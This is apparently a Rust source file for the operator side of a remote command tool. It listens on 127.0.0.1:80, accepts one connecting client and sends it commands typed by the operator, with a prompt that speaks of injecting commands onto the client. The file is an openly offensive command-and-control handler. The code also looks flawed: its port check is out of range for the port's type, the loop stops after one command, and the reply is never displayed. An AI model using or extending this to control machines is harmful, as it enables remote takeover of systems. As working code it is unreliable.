
use std::io::{self, BufRead};
use std::io::{Write, BufReader};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream, Shutdown};
use std::process::{Command, exit};


fn main() {
   
    let bind_ip = "127.0.0.1";
    let bind_port = 80; 
    let ip = bind_ip.parse::<Ipv4Addr>();
    //catching error
    let address = match ip{
        Ok(i) => i,
        Err(e) => {println!("{}", e); exit(0)}
    };

    if bind_port < 0 || bind_port > 65535{
        //error out cause no more ports 
        println!("Port number must be greater than or equal to 0, and less than 65536.");
        exit(0);
    }

    let cs = SocketAddrV4::new(address, bind_port);
    let listen = TcpListener::bind(cs);

    let listener = match listen{
        Ok(i) => i,
        Err(e) => {println!("{}", e); exit(0)}
    };
    let (mut clientsocket, clientaddress) = listener.accept().unwrap();
    println!("Client connected from {}", clientaddress);

    loop {
        println!("Enter command you wish to inject onto the client: ");
        let mut input: String = String::new();
        io::stdin().read_line(&mut input).expect("String expected");
        input.push('\0');
        //add null byte to add as end of string 

        clientsocket.write(&mut input.as_bytes());

        let mut buffer:Vec<u8> = Vec::new();
       let mut reader =  BufReader::new(&clientsocket);
        reader.read_until(b'\0', &mut buffer);

        

        break;


    }

    drop(listener);
    

}
